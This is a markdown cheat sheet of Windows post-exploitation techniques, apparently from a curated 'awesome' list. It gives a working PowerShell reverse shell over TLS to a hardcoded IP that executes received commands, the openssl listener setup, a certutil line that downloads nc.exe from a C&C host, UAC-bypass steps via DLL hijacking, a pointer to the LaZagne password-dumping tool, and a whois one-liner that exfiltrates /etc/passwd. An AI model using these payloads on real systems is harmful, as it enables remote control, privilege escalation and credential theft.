# Awesome Post Exploitation
## Windows Payload
### List of windows post exploitation
  
- [OpenSSL Server Reverse Shell from Windows Client](https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926) [https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998]  
**Server side**  
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes  
openssl s_server -quiet -key key.pem -cert cert.pem -port 9876  
```
**Client side**  
```
$socket = New-Object Net.Sockets.TcpClient('206.189.70.79', 9876)
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fake.domain')
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}  
```
- [LaZagne - Tool for reveal and find password in Windows](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)  

- **Download file with certutil**  
`certutil -urlcache -split -f http://<C&C IP>/nc.exe nc.exe`  

- [**UAC Bypass via SystemPropertiesAdvanced.exe and DLL Hijacking**](https://egre55.github.io/system-properties-uac-bypass/)  
```
SystemPropertiesComputerName.exe  
SystemPropertiesHardware.exe  
SystemPropertiesProtection.exe  
SystemPropertiesRemote.exe  
```
Create "srrstr.dll" dll inside  
```
C:\Windows\SysWOW64\  
C:\Windows\System\  
C:\Windows\  
C:\Users\research\AppData\Local\Microsoft\WindowsApps\  
```

  
## Exfiltration  
- **Send payload with whois**  
Server side  
```nc -lvp 4444```  
Client side  
```
whois -h <C&C IP> -p 4444 `cat /etc/passwd | base64`  
```  
